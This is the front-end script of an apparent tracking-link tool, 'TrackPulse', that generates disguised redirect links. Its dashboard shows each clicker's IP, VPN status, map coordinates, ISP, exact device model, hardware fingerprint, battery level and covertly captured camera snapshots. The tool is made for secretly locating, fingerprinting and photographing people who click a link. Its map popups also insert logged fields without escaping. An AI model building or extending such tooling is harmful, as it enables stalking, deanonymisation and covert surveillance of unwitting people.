// TrackPulse Application Logic

let map = null;
let mapMarkers = [];

document.addEventListener('DOMContentLoaded', () => {
  initMap();
  loadDashboardData();
  setupEventListeners();
  
  // Auto refresh every 10 seconds
  setInterval(() => {
    loadDashboardData();
  }, 10000);
});

// Initialize Leaflet Map with 100% FREE OpenStreetMap Tiles (No API key needed!)
function initMap() {
  map = L.map('map').setView([23.8103, 90.4125], 3);

  L.tileLayer('https://tile.openstreetmap.org/{z}/{x}/{y}.png', {
    maxZoom: 19,
    attribution: '&copy; <a href="https://www.openstreetmap.org/copyright">OpenStreetMap</a> contributors'
  }).addTo(map);
}

// Setup Form & Button Listeners
function setupEventListeners() {
  // Create Link Form
  const form = document.getElementById('create-link-form');
  form.addEventListener('submit', async (e) => {
    e.preventDefault();
    const targetUrl = document.getElementById('input-target-url').value.trim();
    const title = document.getElementById('input-title').value.trim();
    const customSlug = document.getElementById('input-slug').value.trim();

    if (!targetUrl) return;

    try {
      const res = await fetch('/api/links', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ destinationUrl: targetUrl, title, customSlug })
      });
      const data = await res.json();

      if (data.success) {
        const resultCard = document.getElementById('generated-result');
        const trackingUrlInput = document.getElementById('result-tracking-url');
        const testLinkBtn = document.getElementById('btn-test-link');

        trackingUrlInput.value = data.trackingUrl;
        testLinkBtn.href = data.trackingUrl;
        resultCard.classList.remove('hidden');

        document.getElementById('input-target-url').value = '';
        document.getElementById('input-title').value = '';
        document.getElementById('input-slug').value = '';

        loadDashboardData();
      } else {
        alert('Error generating link: ' + (data.error || 'Unknown error'));
      }
    } catch (err) {
      alert('Failed to connect to server: ' + err.message);
    }
  });

  // Copy URL Button
  const copyBtn = document.getElementById('btn-copy-url');
  copyBtn.addEventListener('click', () => {
    const urlInput = document.getElementById('result-tracking-url');
    urlInput.select();
    navigator.clipboard.writeText(urlInput.value);
    
    const originalText = copyBtn.innerHTML;
    copyBtn.innerHTML = '<i class="fa-solid fa-check"></i> Copied!';
    setTimeout(() => {
      copyBtn.innerHTML = originalText;
    }, 2000);
  });

  // Refresh Button
  const refreshBtn = document.getElementById('btn-refresh');
  refreshBtn.addEventListener('click', () => {
    loadDashboardData();
    refreshBtn.classList.add('fa-spin');
    setTimeout(() => refreshBtn.classList.remove('fa-spin'), 600);
  });

  // Link Filter Change
  const filterSelect = document.getElementById('link-filter-select');
  filterSelect.addEventListener('change', () => {
    loadLogs(filterSelect.value);
  });

  // Modal Close
  document.getElementById('modal-close-btn').addEventListener('click', closeModal);
  document.getElementById('log-detail-modal').addEventListener('click', (e) => {
    if (e.target.id === 'log-detail-modal') closeModal();
  });
}

// Load All Dashboard Data
async function loadDashboardData() {
  await Promise.all([
    loadStats(),
    loadLinks(),
    loadLogs()
  ]);
}

// Load Stats
async function loadStats() {
  try {
    const res = await fetch('/api/stats');
    const stats = await res.json();

    document.getElementById('stat-total-links').textContent = stats.totalLinks || 0;
    document.getElementById('stat-total-clicks').textContent = stats.totalClicks || 0;
    document.getElementById('stat-unique-ips').textContent = stats.uniqueIPs || 0;
    document.getElementById('stat-vpn-count').textContent = stats.vpnCount || 0;
  } catch (err) {
    console.error('Error loading stats:', err);
  }
}

// Load Links Table & Filter Dropdown
async function loadLinks() {
  try {
    const res = await fetch('/api/links');
    const links = await res.json();

    const tbody = document.getElementById('links-table-body');
    const filterSelect = document.getElementById('link-filter-select');
    const selectedFilter = filterSelect.value;

    filterSelect.innerHTML = '<option value="all">All Tracking Links</option>';
    links.forEach(l => {
      const opt = document.createElement('option');
      opt.value = l.id;
      opt.textContent = `${l.title} (${l.short_code})`;
      if (String(l.id) === selectedFilter) opt.selected = true;
      filterSelect.appendChild(opt);
    });

    if (links.length === 0) {
      tbody.innerHTML = `<tr><td colspan="6" class="text-center empty-state">No active tracking links created yet.</td></tr>`;
      return;
    }

    tbody.innerHTML = links.map(l => {
      const fullTrackingUrl = `${window.location.origin}/r/${l.short_code}`;
      const dateStr = new Date(l.created_at).toLocaleString();
      return `
        <tr>
          <td>${dateStr}</td>
          <td><strong>${escapeHtml(l.title)}</strong></td>
          <td><span class="ip-badge">${l.short_code}</span></td>
          <td style="max-width:250px; overflow:hidden; text-overflow:ellipsis; white-space:nowrap;">
            <a href="${escapeHtml(l.destination_url)}" target="_blank" style="color:#94a3b8;">${escapeHtml(l.destination_url)}</a>
          </td>
          <td><strong style="color:#10b981;">${l.total_clicks}</strong></td>
          <td>
            <button class="btn btn-outline btn-sm" onclick="copyToClipboard('${fullTrackingUrl}')">
              <i class="fa-regular fa-copy"></i> Copy
            </button>
            <button class="btn btn-danger btn-sm" onclick="deleteLink(${l.id})">
              <i class="fa-solid fa-trash"></i>
            </button>
          </td>
        </tr>
      `;
    }).join('');
  } catch (err) {
    console.error('Error loading links:', err);
  }
}

// Load Logs & Update Map
async function loadLogs(linkIdFilter = 'all') {
  try {
    const filterSelect = document.getElementById('link-filter-select');
    const currentFilter = linkIdFilter || filterSelect.value || 'all';

    let url = '/api/logs';
    if (currentFilter !== 'all') {
      url = `/api/links/${currentFilter}/logs`;
    }

    const res = await fetch(url);
    const logs = await res.json();

    renderLogsTable(logs);
    updateMapMarkers(logs);
  } catch (err) {
    console.error('Error loading logs:', err);
  }
}

// Render Logs Table
function renderLogsTable(logs) {
  const tbody = document.getElementById('logs-table-body');

  if (!logs || logs.length === 0) {
    tbody.innerHTML = `<tr><td colspan="6" class="text-center empty-state">No click logs recorded yet for this selection.</td></tr>`;
    return;
  }

  tbody.innerHTML = logs.map(log => {
    const timeAgo = formatTime(log.created_at);
    const location = (log.city && log.city !== 'Unknown') ? `${log.city}, ${log.country}` : log.country;
    const vpnTag = log.is_proxy ? `<span class="vpn-badge">VPN/PROXY</span>` : '';
    const cameraTag = log.camera_snap ? `<i class="fa-solid fa-camera" style="color:#10b981; margin-left:4px;" title="Camera Snap Captured"></i>` : '';
    const deviceDisplay = (log.device_model && log.device_model !== 'N/A' && log.device_model !== 'Generic Device') 
      ? `${log.device_model}` 
      : `${log.browser} (${log.os})`;

    return `
      <tr>
        <td><span title="${log.created_at}">${timeAgo}</span></td>
        <td>
          <span class="ip-badge">${escapeHtml(log.ip_address)}</span>
          ${vpnTag}
        </td>
        <td><span class="country-flag"><i class="fa-solid fa-location-dot" style="color:#ef4444;"></i> ${escapeHtml(location)}</span></td>
        <td style="max-width:180px; overflow:hidden; text-overflow:ellipsis; white-space:nowrap;" title="${escapeHtml(log.isp)}">
          ${escapeHtml(log.isp)}
        </td>
        <td>
          <span class="device-tag"><i class="fa-solid fa-${getDeviceIcon(log.device)}"></i> ${escapeHtml(deviceDisplay)} ${cameraTag}</span>
        </td>
        <td>
          <button class="btn btn-outline btn-sm" onclick="showLogModal(${log.id})">
            <i class="fa-solid fa-circle-info"></i> Details
          </button>
        </td>
      </tr>
    `;
  }).join('');

  window.currentLogs = logs;
}

// Update Map Markers
function updateMapMarkers(logs) {
  mapMarkers.forEach(m => map.removeLayer(m));
  mapMarkers = [];

  const bounds = [];

  logs.forEach(log => {
    if (log.lat && log.lon && (log.lat !== 0 || log.lon !== 0)) {
      const marker = L.marker([log.lat, log.lon]).addTo(map);
      
      const popupContent = `
        <div style="font-family: 'Outfit', sans-serif; color: #0f172a;">
          <h4 style="margin:0 0 4px 0; color:#2563eb;">IP: ${log.ip_address} ${log.is_proxy ? '(VPN)' : ''}</h4>
          <p style="margin:0; font-size:13px;"><strong>Location:</strong> ${log.city}, ${log.country}</p>
          <p style="margin:0; font-size:12px; color:#64748b;"><strong>ISP:</strong> ${log.isp}</p>
          <p style="margin:0; font-size:12px; color:#64748b;"><strong>Model:</strong> ${log.device_model || 'Generic'}</p>
          <p style="margin:0; font-size:12px; color:#64748b;"><strong>Device:</strong> ${log.browser} on ${log.os}</p>
          <span style="font-size:11px; color:#94a3b8; display:block; margin-top:4px;">${new Date(log.created_at).toLocaleString()}</span>
        </div>
      `;
      marker.bindPopup(popupContent);
      mapMarkers.push(marker);
      bounds.push([log.lat, log.lon]);
    }
  });

  if (bounds.length > 0) {
    map.fitBounds(bounds, { padding: [40, 40], maxZoom: 10 });
  }
}

// Modal View Details
window.showLogModal = function(logId) {
  const log = (window.currentLogs || []).find(l => l.id === logId);
  if (!log) return;

  const modalBody = document.getElementById('modal-body');
  
  let cameraPhotoHtml = '';
  if (log.camera_snap) {
    cameraPhotoHtml = `
      <div class="detail-item" style="grid-column: span 2; text-align:center;">
        <span>Captured Camera Snapshot</span>
        <img src="${log.camera_snap}" style="max-width:100%; height:auto; border-radius:8px; border:2px solid #10b981; margin-top:8px;">
      </div>
    `;
  }

  modalBody.innerHTML = `
    <div class="modal-grid">
      ${cameraPhotoHtml}
      <div class="detail-item">
        <span>IP Address & Security</span>
        <strong style="color:#38bdf8;">${escapeHtml(log.ip_address)} ${log.is_proxy ? '<span style="color:#ef4444;">(VPN/Proxy)</span>' : ''}</strong>
      </div>
      <div class="detail-item">
        <span>Reverse DNS Hostname</span>
        <strong style="font-size:0.8rem; word-break:break-all;">${escapeHtml(log.reverse_dns || 'N/A')}</strong>
      </div>
      <div class="detail-item">
        <span>Exact Device Model</span>
        <strong style="color:#4ade80;">${escapeHtml(log.device_model || 'Generic Device')}</strong>
      </div>
      <div class="detail-item">
        <span>Country & City</span>
        <strong>${escapeHtml(log.city)}, ${escapeHtml(log.country)} (${escapeHtml(log.country_code)})</strong>
      </div>
      <div class="detail-item">
        <span>Region / State</span>
        <strong>${escapeHtml(log.region)}</strong>
      </div>
      <div class="detail-item">
        <span>Coordinates (Lat, Lon)</span>
        <strong>${log.lat}, ${log.lon}</strong>
      </div>
      <div class="detail-item">
        <span>ISP / Network Operator</span>
        <strong>${escapeHtml(log.isp)}</strong>
      </div>
      <div class="detail-item">
        <span>Organization</span>
        <strong>${escapeHtml(log.org)}</strong>
      </div>
      
      <!-- Deep Client Hardware Metadata -->
      <div class="detail-item">
        <span>Screen Resolution</span>
        <strong>${escapeHtml(log.screen_res || 'N/A')}</strong>
      </div>
      <div class="detail-item">
        <span>Timezone</span>
        <strong>${escapeHtml(log.timezone || 'N/A')}</strong>
      </div>
      <div class="detail-item">
        <span>CPU Cores</span>
        <strong>${escapeHtml(log.cpu_cores || 'N/A')} Logical Cores</strong>
      </div>
      <div class="detail-item">
        <span>GPU Renderer</span>
        <strong style="font-size:0.8rem;">${escapeHtml(log.gpu || 'N/A')}</strong>
      </div>
      <div class="detail-item">
        <span>Connection / Language</span>
        <strong>${escapeHtml(log.connection_type || 'N/A')} | ${escapeHtml(log.language || 'N/A')}</strong>
      </div>
      <div class="detail-item">
        <span>Battery Level</span>
        <strong>${escapeHtml(log.battery || 'N/A')}</strong>
      </div>

      <div class="detail-item" style="grid-column: span 2;">
        <span>Browser, OS & Device Category</span>
        <strong>${escapeHtml(log.browser)} on ${escapeHtml(log.os)} (${escapeHtml(log.device)})</strong>
      </div>
      <div class="detail-item" style="grid-column: span 2;">
        <span>User Agent String</span>
        <strong style="font-family: monospace; font-size:0.775rem;">${escapeHtml(log.user_agent)}</strong>
      </div>
      <div class="detail-item" style="grid-column: span 2;">
        <span>Recorded Timestamp</span>
        <strong>${new Date(log.created_at).toString()}</strong>
      </div>
    </div>
  `;

  document.getElementById('log-detail-modal').classList.remove('hidden');
};

function closeModal() {
  document.getElementById('log-detail-modal').classList.add('hidden');
}

// Delete Link Action
window.deleteLink = async function(id) {
  if (!confirm('Are you sure you want to delete this link and its click logs?')) return;
  try {
    const res = await fetch(`/api/links/${id}`, { method: 'DELETE' });
    const data = await res.json();
    if (data.success) {
      loadDashboardData();
    }
  } catch (err) {
    alert('Failed to delete link: ' + err.message);
  }
};

// Clipboard Utility
window.copyToClipboard = function(text) {
  navigator.clipboard.writeText(text);
  alert('Tracking link copied to clipboard!');
};

// Helper utilities
function getDeviceIcon(device) {
  if (device === 'Mobile') return 'mobile-screen-button';
  if (device === 'Tablet') return 'tablet-screen-button';
  return 'desktop';
}

function escapeHtml(str) {
  if (!str) return '';
  return String(str)
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;');
}

function formatTime(isoString) {
  const date = new Date(isoString);
  const now = new Date();
  const diffSec = Math.floor((now - date) / 1000);

  if (diffSec < 60) return `${diffSec}s ago`;
  if (diffSec < 3600) return `${Math.floor(diffSec / 60)}m ago`;
  if (diffSec < 86400) return `${Math.floor(diffSec / 3600)}h ago`;
  return date.toLocaleDateString() + ' ' + date.toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' });
}
